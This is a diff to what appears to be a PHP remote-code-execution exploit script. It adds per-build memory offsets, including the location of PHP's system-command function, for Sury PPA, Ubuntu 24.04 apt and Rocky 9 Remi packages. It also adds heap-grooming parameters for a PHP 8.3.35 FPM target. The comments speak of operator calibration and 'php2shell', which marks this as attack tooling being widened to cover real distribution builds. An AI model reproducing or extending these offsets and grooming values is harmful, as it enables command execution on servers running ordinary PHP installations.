@@ -42,9 +42,17 @@ OFFSETS = {
         "8.4.22": (0x462d30, 0x65b9e0), "8.4.24": (0x464530, 0x65d1e0),
         "8.4.25": (0x464c70, 0x65dc60), "8.4.26": (0x465370, 0x65eb60),
         "8.5.11": (0x5996e0, 0x7b47a0),
-        # Sury PPA (apt.sury.org) on Ubuntu/Debian — different binary layout from Docker
-        "sury-8.3.36": (0x239210, 0x311690), "sury-8.3.35": (0x239210, 0x311690),
-        "sury-8.4.27": (0x246c30, 0x428ce0), "sury-8.4.26": (0x246c30, 0x428ce0),
+        # Sury PPA (apt.sury.org) on Ubuntu/Debian — different binary layout from Docker.
+        # Extracted via zend_function_entry scan (zif_system is NOT in Sury's dynsym -
+        # Sury's build uses -fvisibility=hidden on user-level functions). See
+        # extract_offsets.py for the extraction method; assume 8.3.35 == 8.3.36 Sury
+        # (binary layout did not shift across the point-release patches).
+        "sury-8.3.36": (0x2394c0, 0x311690), "sury-8.3.35": (0x2394c0, 0x311690),
+        "sury-8.4.27": (0x246ee0, 0x428ce0), "sury-8.4.26": (0x246ee0, 0x428ce0),
+        # Distro-apt builds measured 2026-10-27. Added for operator calibration
+        # even where version is pre-8.3.22-grooming (grooming would need re-tuning).
+        "ubuntu-apt-8.3.6": (0x233a10, 0x306380),  # Ubuntu 24.04 noble default apt
+        "rocky9-remi-8.3.36": (0x23b650, 0x30b2c0),  # Rocky 9 Remi (patched; useful for --force test)
     },
     "arm64":  {"7.4.33": (0x309640, 0x3f6024), "8.0.30": (0x31ef70, 0x40ddb0),
                "8.1.34": (0x341e08, 0x42e7a0), "8.2.34": (0x36ff48, 0x4606c0),
@@ -434,6 +442,14 @@ class Exploit:
 #     in $_SESSION — not supported here; sticks to session-file).
 
 CE_FAMILIES = {
+    # 8.3.35 FPM sapi_vma measured 2026-10-27 via extract_offsets.py --php-fpm
+    # against php2shell-fpm (image php:8.3.35-fpm). Other grooming parameters
+    # (dtor_off, struct_off, value_size) MUST be measured on a dedicated lab -
+    # they depend on arena-allocation order which differs per-build; this entry
+    # is placeholder-complete for sapi_vma only.
+    "8.3.35": dict(struct_off=0x78000, dtor_off=0x6E000, value_size=40960, hdr=0x18,
+                   fake_delta=0xE8, entries_delta=0x200, sapi_vma=0x1620760,
+                   ub_off=0x30, sys_off=0x53090, status="sapi_vma-only"),
     "8.4.26": dict(struct_off=0x78000, dtor_off=0x6E000, value_size=40960, hdr=0x18,
                    fake_delta=0xE8, entries_delta=0x200, sapi_vma=0x16E1A00,
                    ub_off=0x30, sys_off=0x53090, status="proven"),
